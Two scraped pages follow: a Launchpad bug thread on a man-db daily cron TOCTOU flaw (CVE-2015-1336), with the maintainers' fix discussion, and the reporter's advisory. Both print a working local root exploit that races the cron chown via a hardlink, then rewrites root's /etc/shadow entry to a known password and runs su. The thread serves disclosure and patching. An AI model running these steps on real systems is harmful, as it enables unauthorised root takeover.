=== Content from bugs.launchpad.net_c389a5c0_20250126_010607.html ===

[Log in / Register](https://bugs.launchpad.net/ubuntu/%2Bsource/man-db/%2Bbug/1482786/%2Blogin)

[![](https://launchpadlibrarian.net/606381979/CoF%2064px.png)](https://launchpad.net/ubuntu)

## [Ubuntu](https://launchpad.net/ubuntu)[man-db package](https://launchpad.net/ubuntu/%2Bsource/man-db)

* [Overview](https://launchpad.net/ubuntu/%2Bsource/man-db)
* [Code](https://code.launchpad.net/ubuntu/%2Bsource/man-db)
* [Bugs](https://bugs.launchpad.net/ubuntu/%2Bsource/man-db)
* Blueprints
* [Translations](https://translations.launchpad.net/ubuntu/%2Bsource/man-db)
* [Answers](https://answers.launchpad.net/ubuntu/%2Bsource/man-db)

# man-db daily cron job TOCTOU bug when processing catman pages

Bug #1482786 reported by
[halfdog](https://launchpad.net/~halfdog)
on 2015-08-07

[262](/%2Bhelp-bugs/bug-heat.html)

This bug affects 2 people

| Affects | | Status | Importance | Assigned to | Milestone |
| --- | --- | --- | --- | --- | --- |
|  | [apport (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/apport "Latest release: 2.31.0-0ubuntu3, uploaded to main on 2025-01-17 22:47:11.031736+00:00 by Benjamin Drung (bdrung), maintained by Ubuntu Developers (ubuntu-devel-discuss-lists)") | Fix Released | Undecided | Unassigned |  |
|  | [man-db (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/man-db "Latest release: 2.13.0-1, uploaded to main on 2024-08-29 16:39:51.762023+00:00 by Colin Watson (cjwatson), maintained by Colin Watson (cjwatson)") | Fix Released | High | [Colin Watson](https://launchpad.net/~cjwatson) |  |
|  | [pam (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/pam "Latest release: 1.4.0-11ubuntu2.5, uploaded to main on 2024-11-20 15:30:11.995553+00:00 by Ponnuvel Palaniyappan (pponnuvel), maintained by Ubuntu Developers (ubuntu-devel-discuss-lists)") | Confirmed | Undecided | Unassigned |  |
|  | [shadow (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/shadow "Latest release: 1:4.16.0-7ubuntu1, uploaded to main on 2025-01-13 22:04:10.516110+00:00 by Skia (hyask), maintained by Ubuntu Developers (ubuntu-devel-discuss-lists)") | Confirmed | Undecided | Unassigned |  |

### Bug Description

The daily mandb cleanup job for old catman pages changes the permissions of all non-man files to user man. The problematic code is:

# expunge old catman pages which have not been read in a week

if [ -d /var/cache/man ]; then

  cd /

  if ! dpkg-statoverride --list /var/cache/man >/dev/null 2>1; then

    find /var/cache/man -ignore\_readdir\_race ! -user man -print0 | \

      xargs -r0 chown -f man || true

  fi

  ...

By creating a hard link and winning the race, user man may escalate privileges to user root. See [1] for full explanation.

man# mkdir -p /var/cache/man/etc

man# ln /var/crash/.lock /var/cache/man/etc/shadow

man# ./DirModifyInotify --Watch /var/cache/man/etc --WatchCount 0 --MovePath /var/cache/man/etc --LinkTarget /etc

... Wait till daily cronjob was run

man# cp /etc/shadow .

man# sed -r -e 's/^root:.\*/root:$1$kKBXcycA$w.1NUJ77AuKcSYYrjLn9s1:15462:0:99999:7:::/' /etc/shadow > x

man# cat x > /etc/shadow; rm x

man# su -s /bin/sh (password is 123)

root# cat shadow > /etc/shadow; chown root /etc/shadow

# lsb\_release -rd

Description: Ubuntu 14.04.3 LTS

Release: 14.04

# apt-cache policy man-db

man-db:

  Installed: 2.6.7.1-1ubuntu1

  Candidate: 2.6.7.1-1ubuntu1

  Version table:

 \*\*\* 2.6.7.1-1ubuntu1 0

        500 <http://archive.ubuntu.com/ubuntu/> trusty-updates/main amd64 Packages

        100 /var/lib/dpkg/status

     2.6.7.1-1 0

        500 <http://archive.ubuntu.com/ubuntu/> trusty/main amd64 Packages

[1] <http://www.halfdog.net/Security/2015/MandbSymlinkLocalRootPrivilegeEscalation/>

## CVE References

* [2015-1336](/bugs/cve/2015-1336 "The daily mandb cleanup job in Man-db...")

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Seth Arnold (seth-arnold)](https://launchpad.net/~seth-arnold) wrote on 2015-08-08: |  |  | [#1](/ubuntu/%2Bsource/man-db/%2Bbug/1482786/comments/1) |
| --- | --- | --- | --- |

Thanks Halfdog, this is as usual very interesting.

I think there's several issues here that should be addressed:

- apport's /var/crash/.lock should be set mode 600 instead of 777

- mandb should be rebuilt with ./configure --disable-cats

- the cronjobs and systemd tmp file handling should be removed

At least, I think it's time to remove the cat pages. They seem more trouble than they are worth. I'm not sure why the cronjob changes file ownership and I'm having trouble finding out why it would need to. So I'd rather remove it, and the reason for it to exist. Are there other mediation steps that we should take?

Removing the cat pages is a fairly large change but I'm not seeing smaller options that would address this without removing them. Are there any other smaller steps that I've overlooked?

Thanks

Thanks Halfdog, this is as usual very interesting.
I think there's several issues here that should be addressed:
- apport's /var/crash/.lock should be set mode 600 instead of 777
- mandb should be rebuilt with ./configure --disable-cats
- the cronjobs and systemd tmp file handling should be removed
At least, I think it's time to remove the cat pages. They seem more trouble than they are worth. I'm not sure why the cronjob changes file ownership and I'm having trouble finding out why it would need to. So I'd rather remove it, and the reason for it to exist. Are there other mediation steps that we should take?
Removing the cat pages is a fairly large change but I'm not seeing smaller options that would address this without removing them. Are there any other smaller steps that I've overlooked?
Thanks

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Seth Arnold (seth-arnold)](https://launchpad.net/~seth-arnold) wrote on 2015-08-08: |  |  | [#2](/ubuntu/%2Bsource/man-db/%2Bbug/1482786/comments/2) |
| --- | --- | --- | --- |

Oh yes, also:

- pam / shadow ought to verify /etc/shadow and other files for correct permissions

Oh yes, also:
- pam / shadow ought to verify /etc/shadow and other files for correct permissions

| Changed in apport (Ubuntu): | |
| --- | --- |
| **status**: | New → Confirmed |
| Changed in man-db (Ubuntu): | |
| **status**: | New → Confirmed |
| Changed in pam (Ubuntu): | |
| **status**: | New → Confirmed |
| Changed in shadow (Ubuntu): | |
| **status**: | New → Confirmed |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [halfdog (halfdog)](https://launchpad.net/~halfdog) wrote on 2015-08-08: |  |  | [#3](/ubuntu/%2Bsource/man-db/%2Bbug/1482786/comments/3) |
| --- | --- | --- | --- |

I second all your recommendations. Just trying to do some considerations from Ubuntu (distributor's ) point of view:

I do not know, if catman is still used, someone might complain. If yes, then in my opinion, creation of files by catman is the problem: when catman is run as user "man", the chown is not required, removal is done as user "man" anyway. So privilege separation would be OK.

If cat pages are generated as user "root", storing them in directory writable by user "man" is VERY risky and should not be performed anyway. In that case separation of storage locations should be more the way to go.

About PAM: I did not verify, if PAM does or does not perform permission checks, in that case the owner check is the problematic part. Here I do not known, if there might be regressions due to unexpected use of passwd/shadow tools together with the chroot option to operate on offline uid-namespaced containers, e.g. switched off LXC before poweron. In that case, the tools could refuse to operate.

I second all your recommendations. Just trying to do some considerations from Ubuntu (distributor's ) point of view:
I do not know, if catman is still used, someone might complain. If yes, then in my opinion, creation of files by catman is the problem: when catman is run as user "man", the chown is not required, removal is done as user "man" anyway. So privilege separation would be OK.
If cat pages are generated as user "root", storing them in directory writable by user "man" is VERY risky and should not be performed anyway. In that case separation of storage locations should be more the way to go.
About PAM: I did not verify, if PAM does or does not perform permission checks, in that case the owner check is the problematic part. Here I do not known, if there might be regressions due to unexpected use of passwd/shadow tools together with the chroot option to operate on offline uid-namespaced containers, e.g. switched off LXC before poweron. In that case, the tools could refuse to operate.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Marc Deslauriers (mdeslaur)](https://launchpad.net/~mdeslaur) wrote on 2015-08-13: |  |  | [#4](/ubuntu/%2Bsource/man-db/%2Bbug/1482786/comments/4) |
| --- | --- | --- | --- |

The man-db insecure chown issue gets CVE-2015-1336.

The man-db insecure chown issue gets CVE-2015-1336.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Marc Deslauriers (mdeslaur)](https://launchpad.net/~mdeslaur) wrote on 2015-08-13: |  |  | [#5](/ubuntu/%2Bsource/man-db/%2Bbug/1482786/comments/5) |
| --- | --- | --- | --- |

Since this isn't a high-severity issue, I would like to make it public so that Debian and Ubuntu can work on a fix.

When can we make this public?

Since this isn't a high-severity issue, I would like to make it public so that Debian and Ubuntu can work on a fix.
When can we make this public?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [halfdog (halfdog)](https://launchpad.net/~halfdog) wrote on 2015-08-14: |  |  | [#6](/ubuntu/%2Bsource/man-db/%2Bbug/1482786/comments/6) |
| --- | --- | --- | --- |

I see it the same way. I would also include publication of the group man to group root privilege escalation via the setgid directory (the e-mails from 2015-05-15 03:00:46 on [1]), which may also use part of the same technique here but was caused by a combination of different factors, one including the kernel, but not clear, which component is at fault and where to start with the fix. The discussion at security-at-kernel.org also ended about 2015-07-06 without final conclusion.

Should I add a second bug report for this other problem, e.g. against package kernel and man-db? Or do publication and see, what will be consensus after discussion and then decide about affected package and way to fix?

Just make the issues public when you feel, that it makes sense.

[1] <http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/>

I see it the same way. I would also include publication of the group man to group root privilege escalation via the setgid directory (the e-mails from 2015-05-15 03:00:46 on [1]), which may also use part of the same technique here but was caused by a combination of different factors, one including the kernel, but not clear, which component is at fault and where to start with the fix. The discussion at security-at-kernel.org also ended about 2015-07-06 without final conclusion.
Should I add a second bug report for this other problem, e.g. against package kernel and man-db? Or do publication and see, what will be consensus after discussion and then decide about affected package and way to fix?
Just make the issues public when you feel, that it makes sense.
[1] http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Colin Watson (cjwatson)](https://launchpad.net/~cjwatson) wrote on 2015-08-15: |  |  | [#7](/ubuntu/%2Bsource/man-db/%2Bbug/1482786/comments/7) |
| --- | --- | --- | --- |

Can you please give me (= upstream, Debian maintainer) a chance to think about it before doing anything invasive like switching to --disable-cats? That seems to me to be a significant change beyond what I'd normally expect the security team to do, and I expect that this can be fixed otherwise.

Can you please give me (= upstream, Debian maintainer) a chance to think about it before doing anything invasive like switching to --disable-cats? That seems to me to be a significant change beyond what I'd normally expect the security team to do, and I expect that this can be fixed otherwise.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Colin Watson (cjwatson)](https://launchpad.net/~cjwatson) wrote on 2015-08-15: |  |  | [#8](/ubuntu/%2Bsource/man-db/%2Bbug/1482786/comments/8) |
| --- | --- | --- | --- |

Incidentally, I'm a little surprised that this is the first I heard of it given the linked timeline. Did I miss an e-mail somewhere, given that I'm the primary maintainer of this code? I was lucky and happened to notice mails pertaining to this bug in a very busy e-mail folder, but could easily have missed it - a direct notification would have been much more reliable.

Incidentally, I'm a little surprised that this is the first I heard of it given the linked timeline. Did I miss an e-mail somewhere, given that I'm the primary maintainer of this code? I was lucky and happened to notice mails pertaining to this bug in a very busy e-mail folder, but could easily have missed it - a direct notification would have been much more reliable.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Seth Arnold (seth-arnold)](https://launchpad.net/~seth-arnold) wrote on 2015-08-18: |  |  | [#9](/ubuntu/%2Bsource/man-db/%2Bbug/1482786/comments/9) |
| --- | --- | --- | --- |

Colin, there was a related issue that Halfdog reported to us in May that used the /var/cache/man/ directory in conjunction with a kernel oddity to provide a different group man -> root user vulnerability. It's not widely known, but is documented at <http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/>

This second flaw is what encouraged me to suggest taking the more drastic step of disabling the catdoc functionality.

If you can find other solutions that are less invasive, it certainly would be more in keeping with the style of security updates. But with the speed of modern machines, I'm not sure catdocs are as useful as they used to be, so it seemed like an easy step to take to mitigate security problems, both these two and potentially future issues.

Thanks

Colin, there was a related issue that Halfdog reported to us in May that used the /var/cache/man/ directory in conjunction with a kernel oddity to provide a different group man -> root user vulnerability. It's not widely known, but is documented at http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/
This second flaw is what encouraged me to suggest taking the more drastic step of disabling the catdoc functionality.
If you can find other solutions that are less invasive, it certainly would be more in keeping with the style of security updates. But with the speed of modern machines, I'm not sure catdocs are as useful as they used to be, so it seemed like an easy step to take to mitigate security problems, both these two and potentially future issues.
Thanks

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Colin Watson (cjwatson)](https://launchpad.net/~cjwatson) wrote on 2015-08-18: |  |  | [#10](/ubuntu/%2Bsource/man-db/%2Bbug/1482786/comments/10) |
| --- | --- | --- | --- |

My train of thought is that the setgid bit isn't inherently necessary to make cat files work - it was added before my time as maintainer with an unsatisfying explanation, and I've long been intending to look into it properly - and the cron job was there to work around a problem that was never fully diagnosed. IOW, neither of these issues are central to cat files. I plan to pare these things away, but I need to do some auditing to make sure that I'm not going to break anything else in the process.

My train of thought is that the setgid bit isn't inherently necessary to make cat files work - it was added before my time as maintainer with an unsatisfying explanation, and I've long been intending to look into it properly - and the cron job was there to work around a problem that was never fully diagnosed. IOW, neither of these issues are central to cat files. I plan to pare these things away, but I need to do some auditing to make sure that I'm not going to break anything else in the process.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [halfdog (halfdog)](https://launchpad.net/~halfdog) wrote on 2015-08-19: |  |  | [#11](/ubuntu/%2Bsource/man-db/%2Bbug/1482786/comments/11) |
| --- | --- | --- | --- |

Regarding #9 "It's not widely known, but is documented...": currently the document links were provided only to security folks (kernel security, Ubuntu security, Launchpad) working on the issue, there are no known public references to it yet. As long as information does not leak or someone guesses the URL, there is still some time for thorough analysis and fixing.

Regarding #9 "It's not widely known, but is documented...": currently the document links were provided only to security folks (kernel security, Ubuntu security, Launchpad) working on the issue, there are no known public references to it yet. As long as information does not leak or someone guesses the URL, there is still some time for thorough analysis and fixing.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Marc Deslauriers (mdeslaur)](https://launchpad.net/~mdeslaur) wrote on 2015-10-19: |  |  | [#12](/ubuntu/%2Bsource/man-db/%2Bbug/1482786/comments/12) |
| --- | --- | --- | --- |

Has there been any progress on fixing this issue?

Has there been any progress on fixing this issue?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [halfdog (halfdog)](https://launchpad.net/~halfdog) wrote on 2015-10-24: |  |  | [#13](/ubuntu/%2Bsource/man-db/%2Bbug/1482786/comments/13) |
| --- | --- | --- | --- |

Not to my knowledge. Perhaps it is unclear how to proceed as the issue was tagged with apport/pam/shadow after reporting it against mandb. I could split them up, perhaps that would simplify a little.

Apart from that: the mandb issue seems of low-impact, perhaps making it public would help to attract other developers to assist in fixing.

Not to my knowledge. Perhaps it is unclear how to proceed as the issue was tagged with apport/pam/shadow after reporting it against mandb. I could split them up, perhaps that would simplify a little.
Apart from that: the mandb issue seems of low-impact, perhaps making it public would help to attract other developers to assist in fixing.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [halfdog (halfdog)](https://launchpad.net/~halfdog) wrote on 2015-11-23: |  |  | [#14](/ubuntu/%2Bsource/man-db/%2Bbug/1482786/comments/14) |
| --- | --- | --- | --- |

As the issue seems to be minor and there was no progress in the last 3 month, does anyone have objections making this public 2015-11-30 00:00 to give others a chance to fix it?

(Also notified Colin Watson according to this note from 2015-08-15)

As the issue seems to be minor and there was no progress in the last 3 month, does anyone have objections making this public 2015-11-30 00:00 to give others a chance to fix it?
(Also notified Colin Watson according to this note from 2015-08-15)

[Marc Deslauriers (mdeslaur)](https://launchpad.net/~mdeslaur)
on 2015-12-14

| **information type**: | Private Security → Public Security |
| --- | --- |

[Mathew Hodson (mhodson)](https://launchpad.net/~mhodson)
on 2016-02-02

| Changed in man-db (Ubuntu): | |
| --- | --- |
| **importance**: | Undecided → Medium |

[jose (josekm36-j)](https://launchpad.net/~josekm36-j)
on 2016-06-04

| Changed in apport (Ubuntu): | |
| --- | --- |
| **status**: | Confirmed → Fix Committed |
| Changed in man-db (Ubuntu): | |
| **status**: | Confirmed → Fix Committed |
| Changed in pam (Ubuntu): | |
| **status**: | Confirmed → Fix Committed |
| Changed in shadow (Ubuntu): | |
| **status**: | Confirmed → Fix Committed |

[Marc Deslauriers (mdeslaur)](https://launchpad.net/~mdeslaur)
on 2016-06-04

| Changed in apport (Ubuntu): | |
| --- | --- |
| **status**: | Fix Committed → Confirmed |
| Changed in man-db (Ubuntu): | |
| **status**: | Fix Committed → Confirmed |
| Changed in pam (Ubuntu): | |
| **status**: | Fix Committed → Confirmed |
| Changed in shadow (Ubuntu): | |
| **status**: | Fix Committed → Confirmed |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Colin Watson (cjwatson)](https://launchpad.net/~cjwatson) wrote on 2016-12-11: |  |  | [#15](/ubuntu/%2Bsource/man-db/%2Bbug/1482786/comments/15) |
| --- | --- | --- | --- |

Apologies for my long delay in dealing with these bugs, both reported by halfdog. Fixes turned out to be quite complicated, since in part they involved unwinding incorrect logic from nearly 20 years ago and ensuring that everything else built on that was appropriately adjusted.

Here are the relevant sections from my release announcement, which should appear at <https://lists.nongnu.org/archive/html/man-db-announce/2016-12/msg00000.html> in the near future:

\* SECURITY: Eliminate dangerous setgid-root directories. In the default

    configuration, cache files and directories are now owned by man:man

    rather than man:root; man and mandb are now setgid man as well as

    setuid man (except in the --disable-setuid case). This is a much

    simpler and safer solution to the original problem that caused my

    predecessor to make directories setgid root, and doesn't introduce any

    interesting new privilege since the man group's only real purpose is

    to be the man user's primary group and nothing in cache directories is

    group-writeable.

Maintainers of distribution packagers should take care to review their

    installation rules in light of this change.

As far as I know this has no CVE ID, but it is described here:

<http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/>

[...]

Notes for distributors

  ======================

The security fix above was quite involved. If you're trying to backport

  it to a stable release, then you should probably consider at least these

  commits:

e62b9edafe00c51e52863718cb2eb1e29385230e Rename some anomalous x\* functions

    9ab9f3dd9b0d5f290c635995559332c1710e5b4d man(1): Fix gcc warnings

    0f8b5518949866075c25787bdc4e9c064597c21e Separate cache owner from --enable-setuid option

    94b9d1e2a14ce8790d7c73df00d0bbd9e40cd437 Handle cleanup stack more safely

    c7f7daa9b2ffbbf4c45a2b168802a51acc2263c0 Make --disable-cache-owner imply --disable-setuid

    31552334cecee82809059ec598a37d9ea82683f0 Eliminate dangerous setgid-root directories

    755a9551c45da82f99d0ad8e46ef756afbeafb3f Fix distcheck following cache-owner/setuid changes

    75701f7fd9a00108abeb851792231b3d9bc2a67d Fix systemd tmpfiles group/perms of /var/cache/man

Feel free to contact me if you have difficulty. You should also

  consider

  <http://www.halfdog.net/Security/2015/MandbSymlinkLocalRootPrivilegeEscalation/>,

  which could not be fixed without fixing the above bug first; while this

  bug was in Debian-specific cron jobs, others may have copied them.

I've uploaded 2.7.6-1 to unstable with fixes for these vulnerabilities. I'd be happy to help out the Debian and Ubuntu security teams with backports if they need it, although hopefully the above list of git commits is enough to get started.

Apologies for my long delay in dealing with these bugs, both reported by halfdog. Fixes turned out to be quite complicated, since in part they involved unwinding incorrect logic from nearly 20 years ago and ensuring that everything else built on that was appropriately adjusted.
Here are the relevant sections from my release announcement, which should appear at https://lists.nongnu.org/archive/html/man-db-announce/2016-12/msg00000.html in the near future:
\* SECURITY: Eliminate dangerous setgid-root directories. In the default
configuration, cache files and directories are now owned by man:man
rather than man:root; man and mandb are now setgid man as well as
setuid man (except in the --disable-setuid case). This is a much
simpler and safer solution to the original problem that caused my
predecessor to make directories setgid root, and doesn't introduce any
interesting new privilege since the man group's only real purpose is
to be the man user's primary group and nothing in cache directories is
group-writeable.
Maintainers of distribution packagers should take care to review their
installation rules in light of this change.
As far as I know this has no CVE ID, but it is described here:
http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/
[...]
Notes for distributors
======================
The security fix above was quite involved. If you're trying to backport
it to a stable release, then you should probably consider at least these
commits:
e62b9edafe00c51e52863718cb2eb1e29385230e Rename some anomalous x\* functions
9ab9f3dd9b0d5f290c635995559332c1710e5b4d man(1): Fix gcc warnings
0f8b5518949866075c25787bdc4e9c064597c21e Separate cache owner from --enable-setuid option
94b9d1e2a14ce8790d7c73df00d0bbd9e40cd437 Handle cleanup stack more safely
c7f7daa9b2ffbbf4c45a2b168802a51acc2263c0 Make --disable-cache-owner imply --disable-setuid
31552334cecee82809059ec598a37d9ea82683f0 Eliminate dangerous setgid-root directories
755a9551c45da82f99d0ad8e46ef756afbeafb3f Fix distcheck following cache-owner/setuid changes
75701f7fd9a00108abeb851792231b3d9bc2a67d Fix systemd tmpfiles group/perms of /var/cache/man
Feel free to contact me if you have difficulty. You should also
consider
http://www.halfdog.net/Security/2015/MandbSymlinkLocalRootPrivilegeEscalation/,
which could not be fixed without fixing the above bug first; while this
bug was in Debian-specific cron jobs, others may have copied them.
I've uploaded 2.7.6-1 to unstable with fixes for these vulnerabilities. I'd be happy to help out the Debian and Ubuntu security teams with backports if they need it, although hopefully the above list of git commits is enough to get started.

| Changed in man-db (Ubuntu): | |
| --- | --- |
| **assignee**: | nobody → Colin Watson (cjwatson) |
| **importance**: | Medium → High |
| **status**: | Confirmed → Fix Committed |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Launchpad Janitor (janitor)](https://launchpad.net/~janitor) wrote on 2016-12-13: |  |  | [#16](/ubuntu/%2Bsource/man-db/%2Bbug/1482786/comments/16) |
| --- | --- | --- | --- |

This bug was fixed in the package man-db - 2.7.6.1-1

---------------

man-db (2.7.6.1-1) unstable; urgency=medium

\* New upstream release:

    - Don't chmod CACHEDIR.TAG if it doesn't exist (closes: #847810).

-- Colin Watson <email address hidden> Mon, 12 Dec 2016 12:51:57 +0000

This bug was fixed in the package man-db - 2.7.6.1-1
---------------
man-db (2.7.6.1-1) unstable; urgency=medium
\* New upstream release:
- Don't chmod CACHEDIR.TAG if it doesn't exist (closes: #847810).
-- Colin Watson <cjwatson@debian.org> Mon, 12 Dec 2016 12:51:57 +0000

| Changed in man-db (Ubuntu): | |
| --- | --- |
| **status**: | Fix Committed → Fix Released |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Chris Adams (acdha)](https://launchpad.net/~acdha) wrote on 2018-08-27: |  |  | [#17](/ubuntu/%2Bsource/man-db/%2Bbug/1482786/comments/17) |
| --- | --- | --- | --- |

Was the decision made not to backport this to 14.04 and 16.04 LTS?

Was the decision made not to backport this to 14.04 and 16.04 LTS?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Serge Hallyn (serge-hallyn)](https://launchpad.net/~serge-hallyn) wrote on 2020-05-20: |  |  | [#18](/ubuntu/%2Bsource/man-db/%2Bbug/1482786/comments/18) |
| --- | --- | --- | --- |

@cjwatson - is it safe to assume the fix was entirely in man-db? Or was shadow supposed to do something here as well?

@cjwatson - is it safe to assume the fix was entirely in man-db? Or was shadow supposed to do something here as well?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Colin Watson (cjwatson)](https://launchpad.net/~cjwatson) wrote on 2020-05-20: |  |  | [#19](/ubuntu/%2Bsource/man-db/%2Bbug/1482786/comments/19) |
| --- | --- | --- | --- |

@serge-hallyn: The fix for the reported bug was entirely in man-db (see comment #15), although it was a combination of upstream and packaging work. The apport, pam, and shadow tasks were spun off by @sarnold; the pam/shadow tasks are explained in comment #2.

@serge-hallyn: The fix for the reported bug was entirely in man-db (see comment #15), although it was a combination of upstream and packaging work. The apport, pam, and shadow tasks were spun off by @sarnold; the pam/shadow tasks are explained in comment #2.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Benjamin Drung (bdrung)](https://launchpad.net/~bdrung) wrote on 2022-11-09: |  |  | [#20](/ubuntu/%2Bsource/man-db/%2Bbug/1482786/comments/20) |
| --- | --- | --- | --- |

The apport lock file permission was addressed in [bug #1862348](/bugs/1862348).

The apport lock file permission was addressed in bug #1862348.

| Changed in apport (Ubuntu): | |
| --- | --- |
| **status**: | Confirmed → Fix Released |

[See full activity log](https://bugs.launchpad.net/ubuntu/%2Bsource/man-db/%2Bbug/1482786/%2Bactivity)

To post a comment you must [log in](%2Blogin?comments=all).

* [Report a bug](/ubuntu/%2Bsource/man-db/%2Bfilebug)

This report contains
**Public Security**
information

Everyone can see this security related information.

You are
[not directly subscribed to this bug's notifications.](/ubuntu/%2Bsource/man-db/%2Bbug/1482786/%2Bsubscribe)

Subscribing...

* [Edit bug mail](https://bugs.launchpad.net/ubuntu/%2Bsource/man-db/%2Bbug/1482786/%2Bsubscriptions "View and change your subscriptions to this bug")

## Other bug subscribers

[Subscribe someone else](https://bugs.launchpad.net/ubuntu/%2Bsource/man-db/%2Bbug/1482786/%2Baddsubscriber "Launchpad will email that person whenever this bugs changes")

## Remote bug watches

Bug watches keep track of this bug in other bug trackers.

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
4d55102
([Get the code!](https://dev.launchpad.net/))



=== Content from www.halfdog.net_5a11f512_20250124_122556.html ===

[www.halfdog.net](/) /
[Security](/Security/) /
[2015](/Security/2015/) / MandbSymlinkLocalRootPrivilegeEscalation /

Share via
[f](https://www.facebook.com/sharer.php?u=https%3A%2F%2Fwww.halfdog.net%2FSecurity%2F2015%2FMandbSymlinkLocalRootPrivilegeEscalation%2F&t=Mandb%20symlink%20local%20root%20privilege%20escalation "facebook")
[g+](https://plus.google.com/share?url=https://www.halfdog.net/Security/2015/MandbSymlinkLocalRootPrivilegeEscalation/ "google+")
# Introduction

## Problem description:

The daily mandb cleanup job for old catman
pages changes the permissions of all non-man files to user man.
This happens e.g. under Ubuntu Vivid with */etc/cron.daily/man-db*
when systemd is not installed (*/run/systemd/system* does
not exist). The problematic code is

# expunge old catman pages which have not been read in a week
if [ ! -d /run/systemd/system ] && [ -d /var/cache/man ]; then
cd /
if ! dpkg-statoverride --list /var/cache/man >/dev/null 2>&1; then
echo "Running find" >&2
find /var/cache/man -ignore\_readdir\_race ! -user man -print0 | \
xargs -r0 chown -f man || true
fi
start-stop-daemon --start --pidfile /dev/null --startas /bin/sh \
--oknodo --chuid man $iosched\_idle -- -c \
"find /var/cache/man -type f -name '\*.gz' -atime +6 -print0 | \
xargs -r0 rm -f"
fi

On Ubuntu Trusty, problematic code looks similar, just has
no dependency to systemd existance:

# expunge old catman pages which have not been read in a week
if [ -d /var/cache/man ]; then
cd /
if ! dpkg-statoverride --list /var/cache/man >/dev/null 2>1; then
find /var/cache/man -ignore\_readdir\_race ! -user man -print0 | \
xargs -r0 chown -f man || true
fi
...

# Methods

**Finding hardlinking target:**
To start with, user man has to hardlink a file not owned by
user man. Without hardlink protection (*/proc/sys/fs/protected\_hardlinks*
set to 0), any root owned system file will do and chown will make
it accessible to user *man*.

Without hardlink protection, user *man* one could race
with find traversing the directories. It seems that new version
of find with fts uses secure open and always checks stat of each
file inode, both when entering subdirectories and when leaving.
So a real hardlink to a file of another user is needed.

Even with hardlink protection, linking to file writable by
user *man* is still allowed, but files have to reside on same
file system. On standard Ubuntu Vivid system, there are just few
target files:

man# find / -mount -type f -perm -0002 2> /dev/null
/var/crash/.lock
man# ls -al /var/crash/.lock
-rwxrwxrwx 1 root root 0 May 23 13:10 /var/crash/.lock

**Using Timerace Using Inotify:**
As the mandb cronjob will change ownership of any file to user
man, there are numerous targets for privilege escalation. The
one I like best when /bin/su SUID binary is available to change
/etc/shadow. PAM just does not recognise this state, so only root
password has to be cleared for su logon. For that purpose, the
good old inotify-tool [DirModifyInotify-20110530.c](../../2010/FilesystemRecursionAndSymlinks/DirModifyInotify-20110530.c)
from a previous [article](../../2010/FilesystemRecursionAndSymlinks/index.html). To escalate following steps are sufficient:

man# mkdir -p /var/cache/man/etc
man# ln /var/crash/.lock /var/cache/man/etc/shadow
man# ./DirModifyInotify --Watch /var/cache/man/etc --WatchCount 0 --MovePath /var/cache/man/etc --LinkTarget /etc
... Wait till daily cronjob was run
man# cp /etc/shadow .
man# sed -r -e 's/^root:.\*/root:$1$kKBXcycA$w.1NUJ77AuKcSYYrjLn9s1:15462:0:99999:7:::/' /etc/shadow > x
man# cat x > /etc/shadow; rm x
man# su -s /bin/sh (password is 123)
root# cat shadow > /etc/shadow; chown root /etc/shadow

If one does not want want PAM or su to write something to logs,
trip over some audit/apparmor settings, we may want to make some
library directory man-owned and place rogue library variant there.

# Results, Discussion

It seems that user *man* is not really used, hence privilege
escalation is not so much of a deal. But there are two things
to be considered:

* Cron scripts in that quality should not slip though quality
  controls as the bug is easy to detect. Developers without security
  background may use them as template for own scripts, thus bad
  practice is inherited in new projects.
* PAM library should not operate on shadow writable by anyone
  else than root user.
# Timeline

* 20150512: Discovery
* 20150807: Ubuntu bug report, see [1482786](https://bugs.launchpad.net/ubuntu/%2Bsource/man-db/%2Bbug/1482786)
* 20151202: Notified other distros via oss-security
# Material, References

* Launchpad bug report[1482786](https://bugs.launchpad.net/ubuntu/%2Bsource/man-db/%2Bbug/1482786)
